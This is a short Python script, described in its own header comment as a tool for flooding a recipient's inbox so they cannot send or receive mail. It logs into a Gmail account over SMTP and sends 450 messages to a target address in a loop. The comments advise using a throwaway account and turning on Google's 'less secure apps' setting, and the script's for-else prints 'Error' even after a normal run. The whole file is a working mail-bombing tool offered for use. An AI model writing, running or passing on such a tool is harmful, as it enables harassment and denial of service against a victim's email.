#This program will use for floodng the mails to receiver so that receiver will not send or receive any mail and we recommanded please use a temparary mail ID for this program
import smtplib

print(
    "Before using this programe firstly open the browser and login the gmail ID which will used in this programe \n then click this link and allow the less secure apps \n https://myaccount.google.com/lesssecureapps\n\n")
Sender_Gmail_ID = input('Enter the Sender Gmail which is using by this program:--> \n').lower().strip()
Destination_Gmail_ID = input('Enter the Destination Gmail ID:--> \n').lower().strip()
Sender_Password = input('Please Enter the Password Here:---> \n')
message = ''


def execution_program(Sender_Gmail_ID, Sender_Password, Destination_Gmail_ID, message):
    for var in range(0, 450):
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(Sender_Gmail_ID, Sender_Password)
        s.sendmail(Sender_Gmail_ID, Destination_Gmail_ID, message)
        s.quit()
    else:
        print('Error')


print('Do you want send the message to destination So type YES otherwise NO:---> \n')
CHOICE = input().lower().strip()
if CHOICE == 'yes':
    message = input('Type Here your message:---> \n')
print('\n\nRunning...')
execution_program(Sender_Gmail_ID, Sender_Password, Destination_Gmail_ID, message)

print('\nExecution Successful')